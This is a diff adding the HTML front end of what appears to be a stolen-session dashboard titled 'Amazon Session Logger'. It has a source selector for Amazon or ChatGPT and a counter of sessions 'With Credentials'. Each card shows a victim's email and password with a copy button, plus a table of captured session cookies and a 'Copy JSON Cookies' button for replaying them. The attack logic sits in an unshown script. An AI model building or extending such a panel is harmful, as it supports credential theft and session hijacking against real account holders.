@@ -1,0 +1,98 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Amazon Session Logger Dashboard</title>
+    <link rel="stylesheet" href="style.css" />
+    <!-- Google Fonts -->
+    <link
+      href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap"
+      rel="stylesheet"
+    />
+  </head>
+  <body>
+    <div class="container">
+      <header>
+        <div class="logo">
+          <span class="icon">📦</span>
+          <h1>Session Logger</h1>
+        </div>
+        <div class="controls">
+          <select id="source-select" class="source-select">
+            <option value="amazon">Amazon</option>
+            <option value="chatgpt">ChatGPT</option>
+          </select>
+        </div>
+        <div class="stats">
+          <div class="stat-item">
+            <span class="stat-label">Total Sessions</span>
+            <span class="stat-value" id="total-sessions">0</span>
+          </div>
+          <div class="stat-item">
+            <span class="stat-label">With Credentials</span>
+            <span class="stat-value highlight" id="total-creds">0</span>
+          </div>
+        </div>
+      </header>
+
+      <main id="session-grid">
+        <!-- Loading State -->
+        <div class="loading">
+          <div class="spinner"></div>
+          <p>Loading sessions...</p>
+        </div>
+      </main>
+    </div>
+
+    <!-- Template for Session Card -->
+    <template id="card-template">
+      <div class="card">
+        <div class="card-header">
+          <div class="user-info">
+            <span class="status-indicator"></span>
+            <h3 class="session-id">Session ID</h3>
+          </div>
+          <span class="timestamp">Just now</span>
+        </div>
+
+        <div class="card-body">
+          <div class="credentials-box hidden">
+            <div class="cred-row">
+              <span class="label">Email:</span>
+              <span class="value email">user@example.com</span>
+            </div>
+            <div class="cred-row">
+              <span class="label">Password:</span>
+              <span class="value password">••••••••</span>
+              <button class="copy-btn" title="Copy Password">📋</button>
+            </div>
+          </div>
+
+          <div class="cookie-table-container">
+            <table class="cookie-table">
+              <thead>
+                <tr>
+                  <th>Name</th>
+                  <th>Value</th>
+                </tr>
+              </thead>
+              <tbody class="cookie-list">
+                <!-- Cookies will be inserted here -->
+              </tbody>
+            </table>
+          </div>
+
+          <div class="actions">
+            <button class="btn-primary copy-cookies-btn">
+              Copy JSON Cookies
+            </button>
+            <button class="btn-secondary delete-btn">Delete</button>
+          </div>
+        </div>
+      </div>
+    </template>
+
+    <script type="module" src="app.js"></script>
+  </body>
+</html>
